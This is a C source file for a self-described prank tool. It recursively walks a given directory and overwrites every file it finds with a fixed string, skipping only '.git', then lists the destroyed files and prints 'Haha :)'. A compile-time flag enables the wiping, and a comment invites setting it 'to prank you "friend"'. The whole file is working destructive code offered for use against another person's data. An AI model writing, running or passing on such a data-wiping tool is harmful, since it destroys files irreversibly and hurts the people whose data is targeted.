#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "main.h"

#define CORRUPT 0 // <- change this one to prank you "friend"
#define WRITE_WHAT "rakivo\n" // <- change this one to change the content that will be written

const char* const IGNORED[IGNORED_CAP] = {".", "..", ".git"};

size_t corrupted_files_counter = 0;
size_t corrupted_files_curr_cap = CORRUPTED_FILES_CAP;
char** corrupted_files;

void write(const char* const file_name, FILE* file)
{
    if (!file) {
        printf("ERROR: Couldn't open file: %s!\n", file_name);
        exit(1);
    }

    fprintf(file, WRITE_WHAT);

    if (corrupted_files_counter == corrupted_files_curr_cap) {
        corrupted_files = realloc(corrupted_files, (corrupted_files_curr_cap *= 1.5) * sizeof(char*));
        if (!corrupted_files) {
            perror("Couldn't reallocate memory for corrupted_files");
            exit(1);
        }
    }
    corrupted_files[corrupted_files_counter] = malloc(strlen(file_name) + 1);
    if (!corrupted_files[corrupted_files_counter]) {
        perror("Couldn't allocate memory for corrupted file");
        exit(1);
    }

    strcpy(corrupted_files[corrupted_files_counter], file_name);
    corrupted_files_counter++;

    fclose(file);
}

void corrupt(const char* const dir_path)
{
    OPEN_DIR(dp, ep, dir_path);

    while ((ep = readdir(dp))) {
        const char* name = ep->d_name;
        if (isignored(name) == 0) continue;

        char path[PATH_CAP];
        snprintf(path, PATH_CAP, "%s%s%s",
                 dir_path,
                 dir_path[strlen(dir_path) - 1] == '/' ? "" : "/",
                 name);

        if (isfile(path)) {
            write(path, fopen(path, "w"));
        } else {
            corrupt(path);
        }
    }

    if (closedir(dp) != 0) {
        perror("Couldn't close the directory");
        exit(1);
    }
}

int main(const int argc, const char* const* const argv)
{
    if (argc != 2) {
        printf("USAGE: %s <dir_path>", argv[0]);
        return 1;
    }

#if CORRUPT
    corrupted_files = malloc(CORRUPTED_FILES_CAP * sizeof(char*));
    corrupt(argv[1]);

    printf("< ==================== +++ +++ ==================== >\n");
    printf("Now you have %zu corrupted files, here they all are: ", corrupted_files_counter);
    printf("\n< ==================== +++ +++ ==================== >\n\n");

    for (size_t i = 0; i < corrupted_files_counter; ++i) {
        printf("%s\n", corrupted_files[i]);
        free(corrupted_files[i]);
    }

    free(corrupted_files);

    printf("Haha :)");
#endif

    return 0;
}
